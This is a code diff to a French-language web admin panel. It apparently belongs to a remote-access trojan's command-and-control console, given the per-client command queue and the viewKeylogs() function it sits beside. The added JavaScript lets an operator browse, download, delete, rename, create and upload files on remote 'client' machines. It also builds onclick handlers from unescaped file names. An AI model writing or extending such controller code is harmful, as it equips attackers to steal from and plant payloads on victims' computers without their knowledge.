@@ -276,8 +276,8 @@
                             <label>Chemin du répertoire</label>
                             <input type="text" id="dir-path" placeholder="C:\" value="C:\">
                         </div>
-                        <button class="btn btn-success" onclick="listDirectory()">📂 Lister</button>
-                        
+                        <button class="btn btn-success" onclick="listDirectory()">📂 Lister</button>                        <button class="btn" onclick="createFolderPrompt()">📁 Nouveau Dossier</button>
+                        <button class="btn" onclick="uploadFilePrompt()">📤 Upload</button>                        
                         <div id="files-output"></div>
                     </div>
                     
@@ -520,12 +520,173 @@
                             ${file.type === 'dir' ? '📁' : '📄'} <strong>${file.name}</strong><br>
                             <small>Taille: ${file.size || 'N/A'}</small>
                         </div>
+                        <div>
+                            ${file.type === 'dir' ? 
+                                `<button class="btn" onclick="navigateToFolder('${file.path}')">📂 Ouvrir</button>` : 
+                                `<button class="btn" onclick="downloadFile('${file.path}')">📥 Download</button>`
+                            }
+                            <button class="btn" onclick="renameFilePrompt('${file.path}', '${file.name}')">✏️ Renommer</button>
+                            <button class="btn btn-danger" onclick="deleteFile('${file.path}')">🗑️ Supprimer</button>
+                        </div>
                     `;
                     output.appendChild(item);
                 });
             } else {
                 output.innerHTML = `<div class="output-box">${JSON.stringify(result, null, 2)}</div>`;
             }
+        }
+        
+        function navigateToFolder(path) {
+            document.getElementById('dir-path').value = path;
+            listDirectory();
+        }
+        
+        async function downloadFile(filePath) {
+            if (!selectedClient) return;
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/file/download/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({file_path: filePath})
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    showAlert(`Téléchargement de ${filePath} lancé!`, 'success');
+                    
+                    // Poll for result
+                    setTimeout(async () => {
+                        const resultResponse = await fetch(`${API_BASE}/admin/command_result/${result.command_id}`);
+                        const resultData = await resultResponse.json();
+                        
+                        if (resultData.success && resultData.result && resultData.result.file_data) {
+                            // Create download link
+                            const link = document.createElement('a');
+                            link.href = 'data:application/octet-stream;base64,' + resultData.result.file_data;
+                            link.download = filePath.split(/[/\\]/).pop();
+                            link.click();
+                            showAlert('Fichier téléchargé!', 'success');
+                        }
+                    }, 3000);
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function deleteFile(filePath) {
+            if (!selectedClient) return;
+            
+            if (!confirm(`Supprimer ${filePath}?`)) return;
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/file/delete/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({file_path: filePath})
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    showAlert('Suppression lancée!', 'success');
+                    setTimeout(listDirectory, 2000);
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function renameFilePrompt(oldPath, oldName) {
+            if (!selectedClient) return;
+            
+            const newName = prompt(`Nouveau nom pour "${oldName}":`, oldName);
+            if (!newName || newName === oldName) return;
+            
+            const newPath = oldPath.replace(oldName, newName);
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/file/rename/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({old_path: oldPath, new_path: newPath})
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    showAlert('Renommage lancé!', 'success');
+                    setTimeout(listDirectory, 2000);
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function createFolderPrompt() {
+            if (!selectedClient) return;
+            
+            const folderName = prompt('Nom du nouveau dossier:');
+            if (!folderName) return;
+            
+            const currentPath = document.getElementById('dir-path').value;
+            const folderPath = currentPath.endsWith('\\') ? 
+                currentPath + folderName : 
+                currentPath + '\\\\' + folderName;
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/file/create_folder/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({folder_path: folderPath})
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    showAlert('Dossier créé!', 'success');
+                    setTimeout(listDirectory, 2000);
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function uploadFilePrompt() {
+            if (!selectedClient) return;
+            
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (!file) return;
+                
+                const reader = new FileReader();
+                reader.onload = async (event) => {
+                    const base64Data = event.target.result.split(',')[1];
+                    const currentPath = document.getElementById('dir-path').value;
+                    
+                    try {
+                        const response = await fetch(`${API_BASE}/admin/file/upload/${selectedClient}`, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                destination: currentPath,
+                                file_data: base64Data,
+                                filename: file.name
+                            })
+                        });
+                        
+                        const result = await response.json();
+                        if (result.success) {
+                            showAlert(`Upload de ${file.name} lancé!`, 'success');
+                            setTimeout(listDirectory, 2000);
+                        }
+                    } catch (error) {
+                        showAlert('Erreur: ' + error.message, 'error');
+                    }
+                };
+                reader.readAsDataURL(file);
+            };
+            input.click();
         }
         
         async function viewKeylogs() {
